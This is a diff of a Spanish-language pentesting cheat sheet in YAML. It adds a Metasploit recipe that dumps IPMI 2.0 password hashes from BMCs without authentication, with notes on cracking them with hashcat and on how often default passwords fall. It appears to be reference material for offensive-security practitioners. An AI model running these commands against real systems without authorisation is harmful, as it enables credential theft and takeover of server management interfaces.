@@ -577,3 +577,17 @@ commands:
       Con este puerto y versión casa con la configuración por defecto de proxychains (socks4 127.0.0.1
       9050). Solo pasa TCP y necesita una ruta hacia la red: nmap por proxychains, con -sT -Pn.
     refs: [https://www.rapid7.com/db/modules/auxiliary/server/socks_proxy/]
+
+  - id: msf-ipmi-dumphashes
+    title: Hashes de IPMI 2.0 sin autenticación
+    cmd: |
+      use auxiliary/scanner/ipmi/ipmi_dumphashes
+      set RHOSTS {{RHOST}}
+      set OUTPUT_HASHCAT_FILE ipmi.hash
+      run
+    phase: credential-access
+    tags: [ipmi, hash-cracking]
+    notes: >-
+      Prueba usuarios típicos (ADMIN, admin, root, Administrator) y guarda el hash RAKP de los que
+      existen. Se crackea con hashcat -m 7300; las contraseñas de fábrica de los BMC suelen caer.
+    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/]
